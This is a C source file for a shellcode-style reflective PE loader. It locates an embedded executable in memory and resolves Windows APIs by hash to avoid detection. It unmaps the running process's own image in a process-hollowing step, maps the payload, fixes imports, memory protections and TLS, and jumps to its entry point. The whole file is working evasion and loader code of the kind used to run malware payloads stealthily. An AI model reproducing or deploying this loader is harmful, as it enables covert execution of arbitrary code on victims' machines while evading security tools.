#include "../includes/core.h"


#ifdef _WIN64
#define IMAGE_REL_TYPE IMAGE_REL_BASED_DIR64
#else
#define IMAGE_REL_TYPE IMAGE_REL_BASED_HIGHLOW
#endif

__attribute__((section(".text$B")))
static void handle_copy_sections(PVOID AllocatedAddress, PVOID DllAddress, PIMAGE_SECTION_HEADER sec, WORD numSections) {
	picMemcpy(AllocatedAddress, DllAddress, OPT_HEADER(DllAddress)->SizeOfHeaders);

	((PIMAGE_NT_HEADERS)((PBYTE)AllocatedAddress + DOS_HEADER(AllocatedAddress)->e_lfanew))->OptionalHeader.ImageBase = (ULONG_PTR)AllocatedAddress;

	for (DWORD i = 0; i < numSections; i++) {
	    picMemcpy(
	        (PBYTE)AllocatedAddress + sec[i].VirtualAddress,
	        (PBYTE)DllAddress + sec[i].PointerToRawData,
	        sec[i].SizeOfRawData
	    );
	}
}



__attribute__((section(".text$B")))
static void handle_iat_section(Loader *loader, PVOID AllocatedAddress, PVOID DllAddress) {
	PIMAGE_DATA_DIRECTORY importDir = &OPT_HEADER(DllAddress)->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

	if (!importDir->VirtualAddress)
		return;

	PIMAGE_IMPORT_DESCRIPTOR pImportDesc = RVA2VA(PIMAGE_IMPORT_DESCRIPTOR, AllocatedAddress, importDir->VirtualAddress);

	for (; pImportDesc->Name != 0; ++pImportDesc) {
		PCHAR ImportName = RVA2VA(PCHAR, AllocatedAddress, pImportDesc->Name);
		HMODULE ModuleImport = loader->Funcs.LoadLibraryA(ImportName);

		PIMAGE_THUNK_DATA OrgTd = RVA2VA(PIMAGE_THUNK_DATA, AllocatedAddress, pImportDesc->OriginalFirstThunk);
		PIMAGE_THUNK_DATA FirstTd = RVA2VA(PIMAGE_THUNK_DATA, AllocatedAddress, pImportDesc->FirstThunk);

		for (; OrgTd->u1.AddressOfData != 0; ++OrgTd, ++FirstTd) {
			if (IMAGE_SNAP_BY_ORDINAL(OrgTd->u1.Ordinal)) {
				FirstTd->u1.Function = (ULONG_PTR)loader->Funcs.GetProcAddress(ModuleImport, (LPCSTR)IMAGE_ORDINAL(OrgTd->u1.Ordinal));
			} else {
				PIMAGE_IMPORT_BY_NAME pImportName = RVA2VA(PIMAGE_IMPORT_BY_NAME, AllocatedAddress, OrgTd->u1.AddressOfData);
				FirstTd->u1.Function = (ULONG_PTR)loader->Funcs.GetProcAddress(ModuleImport, pImportName->Name);
			}
		}
	}
}

__attribute__((section(".text$B")))
static DWORD SectionCharsToProt(DWORD chars) {
	DWORD exec  = chars & IMAGE_SCN_MEM_EXECUTE;
	DWORD read  = chars & IMAGE_SCN_MEM_READ;
	DWORD write = chars & IMAGE_SCN_MEM_WRITE;

	if (exec && read && write) return PAGE_EXECUTE_READWRITE;
	if (exec && read)          return PAGE_EXECUTE_READ;
	if (exec && write)         return PAGE_EXECUTE_WRITECOPY;
	if (exec)                  return PAGE_EXECUTE;
	if (read && write)         return PAGE_READWRITE;
	if (read)                  return PAGE_READONLY;
	if (write)                 return PAGE_WRITECOPY;
	return PAGE_NOACCESS;
}

__attribute__((section(".text$B")))
static void handle_mem_perms(Loader *loader, PVOID AllocatedAddress, PIMAGE_SECTION_HEADER sec, WORD numSections) {
	for (DWORD i = 0; i < numSections; i++) {
		PVOID secMemory = (PBYTE)AllocatedAddress + sec[i].VirtualAddress;
		SIZE_T secSize = sec[i].SizeOfRawData;
		ULONG old = 0;

		DWORD Prot = SectionCharsToProt(sec[i].Characteristics);
		loader->Funcs.NtProtectVirtualMemory(CurrentProcess(), &secMemory, &secSize, Prot, &old);
	}

	loader->Funcs.NtFlushInstructionCache(CurrentProcess(), NULL, 0);
}

__attribute__((section(".text$B")))
static void handle_tls(Loader *loader, PVOID AllocatedAddress, PVOID DllAddress) {
	PIMAGE_DATA_DIRECTORY tlsDir = &OPT_HEADER(DllAddress)->DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];

	if (!tlsDir->VirtualAddress)
		return;

	PIMAGE_TLS_DIRECTORY tls = RVA2VA(PIMAGE_TLS_DIRECTORY, AllocatedAddress, tlsDir->VirtualAddress);

	if (tls->AddressOfIndex) {
		DWORD index = loader->Funcs.TlsAlloc();
		*(PDWORD)((ULONG_PTR)tls->AddressOfIndex) = index;

		SIZE_T templateSize = tls->EndAddressOfRawData - tls->StartAddressOfRawData;
		SIZE_T totalSize    = templateSize + tls->SizeOfZeroFill;

		if (totalSize > 0) {
			PVOID block = NULL;
			SIZE_T sz = totalSize;
			if (NT_SUCCESS(loader->Funcs.NtAllocateVirtualMemory(CurrentProcess(), &block, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
				if (templateSize > 0)
					picMemcpy(block, (PVOID)tls->StartAddressOfRawData, templateSize);
				loader->Funcs.TlsSetValue(index, block);
			}
		}
	}

	PIMAGE_TLS_CALLBACK *callbacks = (PIMAGE_TLS_CALLBACK *)tls->AddressOfCallBacks;
	if (callbacks) {
		for (; *callbacks; ++callbacks)
			(*callbacks)(AllocatedAddress, DLL_PROCESS_ATTACH, NULL);
	}
}

__attribute__((section(".text$B")))
BOOL loaderEntry(PVOID location, ULONG_PTR asmSavedRsp) {
	PVOID DllAddress       = NULL;
	PVOID PreferedBase     = NULL;
	HANDLE hFile           = NULL;
	HANDLE hSection 	   = NULL;
	PVOID  pBase    	   = NULL;
	SIZE_T viewSize        = 0;
	
	Loader loader          = {0};
	PPEB   peb 			   = NULL;

	UCHAR *scan = (UCHAR *)location;

	while (TRUE) {
	    if (scan[0] == 'M' && scan[1] == 'Z') {
	        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)scan;
	        if (dos->e_lfanew < 0x400) {
	            PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(scan + dos->e_lfanew);
	            if (nt->Signature == IMAGE_NT_SIGNATURE) {
	                DllAddress = (PVOID)scan;
	                break;
	            }
	        }
	    }
	    scan++;
	}

	loader.Modules.ntdll                  = GetModule(NTDLL_HASH);
	loader.Modules.kernel32               = GetModule(KERNEL32_HASH);
	loader.Funcs.NtProtectVirtualMemory   = GetProc(loader.Modules.ntdll,    NTPROTECTVIRTUALMEMORY_HASH);
	loader.Funcs.NtFlushInstructionCache  = GetProc(loader.Modules.ntdll,    NTFLUSHINSTRUCTIONCACHE_HASH);
	loader.Funcs.GetProcAddress           = GetProc(loader.Modules.kernel32, GETPROCADDRESS_HASH);
	loader.Funcs.LoadLibraryA             = GetProc(loader.Modules.kernel32, LOADLIBRARYA_HASH);
	loader.Funcs.NtAllocateVirtualMemory  = GetProc(loader.Modules.ntdll, NTALLOCATEVIRTUALMEMORY_HASH);
	loader.Funcs.NtUnmapViewOfSection     = GetProc(loader.Modules.ntdll, HASHED_NtUnmapViewOfSection);
	loader.Funcs.TlsAlloc                 = GetProc(loader.Modules.kernel32, TLSALLOC_HASH);
	loader.Funcs.TlsSetValue              = GetProc(loader.Modules.kernel32, TLSSETVALUE_HASH);

	
	
	

	PIMAGE_SECTION_HEADER sec = SECTION_HEADER(DllAddress);
	WORD numSections          = FILE_HEADER(DllAddress)->NumberOfSections;

	peb = GetPeb();
	PreferedBase = (PVOID)(ULONGLONG)OPT_HEADER(DllAddress)->ImageBase;
	viewSize     = OPT_HEADER(DllAddress)->SizeOfImage;
	pBase        = PreferedBase;

	loader.Funcs.NtUnmapViewOfSection(CurrentProcess(), peb->ImageBaseAddress);

  	loader.Funcs.NtAllocateVirtualMemory(CurrentProcess(), &pBase, 0, &viewSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  	// if((ULONG_PTR)pBase != (ULONG_PTR)PreferedBase) {
  	// 	return FALSE;
  	// }

	handle_copy_sections(pBase, DllAddress, sec, numSections);
	handle_iat_section(&loader, pBase, DllAddress);
	handle_mem_perms(&loader, pBase, sec, numSections);
	handle_tls(&loader, pBase, DllAddress);
	

	PVOID Entry = RVA2VA(PVOID, pBase, OPT_HEADER(DllAddress)->AddressOfEntryPoint);

	((void (*)(void))Entry)();
}